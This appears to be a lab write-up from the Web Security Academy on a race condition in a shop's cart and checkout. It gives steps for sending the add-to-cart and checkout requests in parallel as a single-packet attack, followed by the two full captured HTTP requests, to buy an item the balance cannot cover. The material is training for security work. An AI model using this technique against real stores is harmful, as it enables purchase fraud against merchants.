Firstly, i tried purchasing item for 77$( i had 100$) then added target item to cart. But item just added and not purchased.

## Solution

1. Add item that costs less than 100$ to cart.
2. Intercept the request to add target item to cart(send to repeater).
3. Intercept puchase request(send to repeater).
4. Add to the group two requests above.
5. Send the group request in parallel(single packet attack). And you will successfully purchase the target item.


## Requests from repeater group

```
POST /cart HTTP/2
Host: 0a15007b04c2155f8159715e00df0018.web-security-academy.net
Cookie: session=NNhDWXExfGDNALmtQUOu5sFkMvv6DTOm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a15007b04c2155f8159715e00df0018.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0a15007b04c2155f8159715e00df0018.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

productId=1&redir=PRODUCT&quantity=1
```

```
POST /cart/checkout HTTP/2
Host: 0a15007b04c2155f8159715e00df0018.web-security-academy.net
Cookie: session=NNhDWXExfGDNALmtQUOu5sFkMvv6DTOm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a15007b04c2155f8159715e00df0018.web-security-academy.net
Referer: https://0a15007b04c2155f8159715e00df0018.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=uhPmjTI87NtWSJxCP0f9aaBibDUqUX4W
```


